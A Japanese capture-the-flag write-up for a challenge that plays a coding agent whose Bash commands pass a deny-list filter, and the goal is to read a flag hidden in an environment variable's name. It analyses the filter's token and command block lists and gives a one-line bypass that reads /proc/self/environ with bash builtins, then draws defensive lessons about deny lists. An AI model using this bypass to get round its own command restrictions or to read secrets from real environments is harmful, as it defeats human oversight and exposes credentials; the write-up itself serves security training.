## 問題

```
あなたはコーディングエージェントです! 制約を回避して環境変数を読んでください!

nc URL
```

コーディングエージェントごっこですね．Bashコマンドを1発だけ撃てるけど，なんか色々禁止されていて，環境変数（flag）を読めればクリア，という形っぽい
```
> nc greenroom.beginners.seccon.games 46777
== greenroom ==
The previous coding agent ran `env`.
The user was not happy.
Some Bash tool calls are now denied.

Submit one Bash command.
> hostname
/bin/bash: line 1: hostname: command not found
^C
```
## 調査

とりあえずディレクトリを見る．

```
> tree

.
├── Dockerfile
├── compose.yaml
└── main.py
```

わかること:
- ロジックは`main.py`一個．Bashコマンドを受け取って制限付きで実行する“ポリシーゲート”が本体っぽい．
- `compose.yaml`を見るとガチガチ．`read_only: true`／`cap_drop: ALL`／`no-new-privileges`／`tmpfs /tmp`（7〜17行目）．コンテナ脱出系ではなく，あくまで「コマンドフィルタを抜けてenvを読む」問題っぽい．

接続するとこのバナーが出る（`main.py` 23〜28行目）．

```
== greenroom ==
The previous coding agent ran `env`.
The user was not happy.
Some Bash tool calls are now denied.

Submit one Bash command.
```

「前のエージェントが`env`を撃って怒られたので，いくつかのBashコマンドを禁止した．1個だけBashコマンドを出せ」と．`main.py`を読んで，何が禁止されていて何が通るのかを把握する．

## main.py : flagはどこにあるか

まずゴールの確認．子プロセスに渡す環境を作る`build_child_env`（210〜219行目）．

```python
# main.py : build_child_env (210〜219行目)
def build_child_env():
    return {
        "PATH": "/app/bin",
        "HOME": "/tmp",
        "LC_ALL": "C",
        "TERM": "dumb",
        "AGENT": "greenroom",
        "MODE": "sandbox",
        FLAG: "x",
    }
```

`FLAG`は12行目で`os.environ.get("FLAG")`，つまりflag文字列そのもの．それを辞書のキーに使って`{FLAG: "x"}`としている．

- 普通なら`FLAG=ctf4b{...}`のように「変数名FLAG・値がflag」になる．
- でもここは`{ FLAG: "x" }`なので「変数名がflag文字列・値が`x`」になる．
- つまり子プロセスの環境には`ctf4b{...}=x`という，名前のほうがflagになった環境変数が1個生える．

しかも`PATH`は`/app/bin`（212行目）で，`Dockerfile`を見るとそこは空ディレクトリ（`mkdir -p /app/bin`しただけ）．外部コマンドは一切無く，使えるのはbashのbuiltinだけという状況．

flagは「環境変数の名前」なので，値を`echo $なんとか`では取れない（名前に`{`や`}`が入っていて変数参照できない）．素直に環境一覧をダンプして`ctf4b{...}=x`を読む方向で考える．

## main.py : 何が禁止されているか

実行は`run_command`（260〜272行目）で，`/bin/bash --restricted`に流す．

```python
# main.py : 実行まわり (128〜129行目, 263〜265行目)
PROLOGUE = "enable -n set export declare typeset readonly compgen source . eval exec command hash enable; "
BASH = ["/bin/bash", "--restricted", "--noprofile", "--norc", "-c"]
...
    proc = subprocess.Popen(
        [*BASH, PROLOGUE + cmd],
        env=build_child_env(),
```

- `--restricted`（rbash）なので，コマンド名に`/`は使えない・出力リダイレクト（`>`）禁止・`cd`不可・PATH変更不可．
- `PROLOGUE`（128行目）で`enable -n ...`して`set export declare ... eval exec command hash enable`等のbuiltinを無効化している．`source`/`.`/`eval`/`exec`あたりの逃げ道を潰す意図っぽい．
- ただし`echo`・`read`・`mapfile`・`printf`みたいな取得系builtinは無効化リストに無い．

入力に対するチェックは`policy_check`（161〜207行目）．二段構え．

一段目は文字列マッチの`deny_by_text`（152〜158行目）．

```python
# main.py : DENY_TOKENS と deny_by_text (30〜37行目, 152〜158行目)
DENY_TOKENS = [
    "$(",
    "`",
    "|",
    "<(",
    ">(",
    "/usr",
]
...
def deny_by_text(cmd):
    for token in DENY_TOKENS:
        if token in cmd:
            return token
    if BIN_PATH_RE.search(cmd):
        return "/bin"
    return None
```

コマンド置換`$(...)`・バッククォート・パイプ`|`・プロセス置換`<( )`/`>( )`・`/usr`が文字列レベルで禁止．さらに`BIN_PATH_RE`（126行目）で`/bin`もブロック．要するに「外部バイナリへのパス」と「サブシェルで値を持ち出す系」を塞いでいる．

二段目はトークン単位の`policy_check`（161〜207行目）．`shlex`で分解して，各コマンド先頭トークンの名前が`DENIED_COMMANDS`（39〜74行目）に入っていたら弾く．

```python
# main.py : policy_check のコマンド名判定 (194〜205行目)
        if token in SHELL_KEYWORDS:
            expect_command = token in COMMAND_START_KEYWORDS
            continue

        if is_assignment(token):
            continue

        command = command_name(token)
        if command in DENIED_COMMANDS:
            return command

        expect_command = False
```

`DENIED_COMMANDS`（39〜74行目）には`env`/`printenv`/`cat`/`tr`/`grep`/`sed`/`awk`/`od`/`strings`/`xxd`/`dd`/`base64`/各種インタプリタ/`bash`/`sh`/`source`/`eval`/`exec`/`command`/`set`/`export`…と，環境を読んだり中身を変換したりする定番がほぼ全部入っている．

重要なのは，ここで見ているのは「コマンドの先頭トークンの名前」だけということ．`<`（入力リダイレクト）はリダイレクトとして扱われ（187〜189行目でターゲットをスキップ），`;`はセパレータ扱い（178〜181行目）．builtinの`mapfile`や`echo`はどの禁止リストにも入っていない．

## 組み立てる

整理すると:
- flagは環境変数の「名前」に入っている（`ctf4b{...}=x`）．環境一覧をそのまま読めばいい．
- `env`/`printenv`/`cat`は禁止．外部バイナリも無い（PATHが空）．使えるのはbash builtinだけ．
- 環境一覧は`/proc/self/environ`から読める．パスに`/usr`も`/bin`も含まないので`deny_by_text`を通る．
- `/proc/self/environ`はNUL区切り．builtinの`mapfile -d ""`ならNUL区切りで配列に読み込める．入力リダイレクト`<`はrbashでも許可されているしポリシー上もリダイレクト扱い．
- 読み込んだ配列を`echo`で吐けばいい．`mapfile`も`echo`も禁止されていない．

ということでペイロード:

```bash
mapfile -d "" a </proc/self/environ;echo "${a[@]}"
```

これがポリシーを通る理由をトークンで追うと:
- `$(`・バッククォート・`|`・`<(`・`/usr`・`/bin`を一切含まない -> `deny_by_text`（152〜158行目）を通過．
- `mapfile` … 先頭コマンド．`DENIED_COMMANDS`に無い．
- `-d` `""` `a` … 引数．
- `<` … リダイレクト（187〜189行目でターゲット`/proc/self/environ`はスキップされ，コマンド名判定の対象にならない）．
- `;` … セパレータ（178行目）．次トークンをまたコマンド先頭として見る．
- `echo` … 先頭コマンド．禁止されていない．
- `"${a[@]}"` … 引数．

実行されると`mapfile -d "" a </proc/self/environ`で環境エントリをNUL区切りで配列`a`に読み込み，`echo "${a[@]}"`が全部スペース区切りで吐く．その中に`ctf4b{...}=x`が混ざって出てくる．

## 分かったこと

- flagは`build_child_env`（218行目）の`{FLAG: "x"}`で「環境変数の名前」として子プロセスに入る（`ctf4b{...}=x`）．
- 環境を読む定番（`env`/`printenv`/`cat`等）は禁止＋PATHが空で外部バイナリ無し（212行目）なので，bash builtinだけで戦う．
- `/proc/self/environ`はポリシーの文字列ブロックに引っかからず，`mapfile`/`echo`/`<`/`;`はどれも禁止されていない．
- -> `mapfile -d "" a </proc/self/environ;echo "${a[@]}"`の1発で環境一覧を吐かせてflagを読む．

## 実行

`nc`で繋いで，`> `のプロンプトにペイロードを1行流すだけ．

```
> echo 'mapfile -d "" a </proc/self/environ;echo "${a[@]}"' | nc greenroom.beginners.seccon.games 46777
...
PATH=/app/bin HOME=/tmp LC_ALL=C TERM=dumb AGENT=greenroom MODE=sandbox ctf4b{__REDACTED__}=x
```

環境ダンプの中に`ctf4b{...}=x`が出てきてフラグ get．

## 原因とか
- 簡易的なbashの再実装の課題を42でやっていたのでとても面白い問題でした！
- フィルタが「コマンド名のブロックリスト」と「危険文字列のブロックリスト」でできているが，環境を読む手段はコマンドだけじゃない．`/proc/self/environ`＋builtin（`mapfile`/`echo`）という，リストに無い経路が残っていた．
- とくに`mapfile`のようなデータ取得系builtinが無効化（`enable -n`）からも`DENIED_COMMANDS`からも漏れていたのが効いた．rbash＋空PATHで外部コマンドを潰しても，builtinで`/proc`を読めば一覧は取れる．
- ブロックリスト方式は「列挙し切れない」のが本質的な弱さで，今回もそこを突かれている．許可した最小限のbuiltin・引数だけを通すアローリスト＋`/proc`へのアクセス遮断のほうが筋が良かった．
- そもそもflagを環境変数として子プロセスに渡している（しかも名前として）こと自体がリスク．秘密を子プロセスの環境に置かない設計にすべきだった．

## 参照
- [Bash Reference — The Restricted Shell（rbash）](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html) — `--restricted`で何が制限され，入力リダイレクト`<`が残ることなど．
- [Bash Reference — mapfile / readarray](https://www.gnu.org/software/bash/manual/html_node/Bash-Builtins.html) — `-d ""`でNUL区切り読み込みができるbuiltin．
- [Linux man — proc(5) /proc/[pid]/environ](https://man7.org/linux/man-pages/man5/proc.5.html) — プロセスの環境をNUL区切りで読めるファイル．
- [OWASP — Bypassing blacklists / CWE-184: Incomplete List of Disallowed Inputs](https://cwe.mitre.org/data/definitions/184.html) — ブロックリストは漏れるという話．今回の本質．
